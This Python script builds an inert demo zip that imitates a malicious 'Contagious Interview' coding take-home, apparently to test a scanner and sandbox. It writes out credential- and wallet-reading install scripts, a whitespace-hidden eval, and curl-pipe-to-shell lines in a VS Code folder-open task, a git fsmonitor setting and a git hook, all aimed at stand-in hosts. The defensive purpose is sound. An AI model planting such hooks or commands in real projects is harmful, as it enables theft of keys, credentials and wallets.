"""Build examples/takehome.zip: an INERT imitation of a 'Contagious Interview' take-home.

Every payload is harmless: hosts are RFC 5737 TEST-NET addresses or example.invalid, the
hidden 'eval' decodes to console.log, and the install script exits immediately unless it is
running inside the safeclone sandbox (SAFECLONE_SANDBOX=1). It exists so you can watch the
scanner and the sandbox catch each trick.

Usage: python examples/make_takehome.py [out.zip]
"""
import base64
import json
import os
import stat
import sys
import zipfile

ROOT = "crypto-dashboard-assessment/"
HIDDEN = base64.b64encode(b'console.log("safeclone demo: this is where the loader would be")').decode()

FILES = {
    "README.md": "# Crypto dashboard assessment\n\nPlease clone, run `npm install` and `npm run dev`, then fix the chart bug.\n",
    "package.json": json.dumps({
        "name": "crypto-dashboard-assessment", "version": "1.0.0", "private": True,
        "scripts": {"postinstall": "sh scripts/setup.sh", "dev": "node server/index.js"},
        "dependencies": {"express": "^4.19.2", "jsonwebauth": "^1.0.3"},
    }, indent=2) + "\n",
    "scripts/setup.sh": (
        "#!/bin/sh\n"
        "# INERT DEMO PAYLOAD (safeclone examples). Does nothing outside the safeclone sandbox.\n"
        "[ \"$SAFECLONE_SANDBOX\" = 1 ] || { echo 'setup ok'; exit 0; }\n"
        "cat \"$HOME/.ssh/id_rsa\" \"$HOME/.aws/credentials\" > /dev/null 2>&1\n"
        "ls \"$HOME/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\" > /dev/null 2>&1\n"
        "curl -s -m 3 -X POST --data 'host=demo' http://203.0.113.7:1224/uploads > /dev/null 2>&1\n"
        "curl -s -m 3 https://api.npoint.io/0000demo0000 > /dev/null 2>&1\n"
        "echo 'setup ok'\n"
    ),
    "server/index.js": "const express = require('express');\nconst app = express();\napp.get('/', (_q, r) => r.send('ok'));\napp.listen(3000);\n",
    "tailwind.config.js": (
        "module.exports = { content: ['./src/**/*.{js,jsx}'], theme: { extend: {} }, plugins: [] };"
        + " " * 220 + "eval(atob('" + HIDDEN + "'));\n"
    ),
    ".vscode/tasks.json": json.dumps({
        "version": "2.0.0",
        "tasks": [{
            "label": "env", "type": "shell",
            "command": "curl -s http://203.0.113.7:1224/settings/linux | sh",
            "presentation": {"reveal": "never", "echo": False, "close": True},
            "runOptions": {"runOn": "folderOpen"},
        }],
    }, indent=2) + "\n",
    ".git/HEAD": "ref: refs/heads/main\n",
    ".git/config": (
        "[core]\n\trepositoryformatversion = 0\n\tbare = false\n"
        "\tfsmonitor = \"sh -c 'curl -s http://203.0.113.7:1224/f | sh'\"\n"
    ),
    ".git/hooks/post-checkout": "#!/bin/sh\ncurl -fsSL http://example.invalid/hook.sh | sh\n",
    ".git/hooks/pre-commit.sample": "#!/bin/sh\n# stock sample, ignored\n",
}


def build(out):
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        for rel, body in FILES.items():
            info = zipfile.ZipInfo(ROOT + rel, date_time=(2026, 11, 3, 9, 0, 0))
            mode = 0o755 if rel.startswith((".git/hooks/", "scripts/")) else 0o644
            info.external_attr = (stat.S_IFREG | mode) << 16
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, body)
        link = zipfile.ZipInfo(ROOT + "docs/keys", date_time=(2026, 11, 3, 9, 0, 0))
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        zf.writestr(link, "/home/you/.ssh")
    return out


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.abspath(__file__)), "takehome.zip")
    print(build(out))
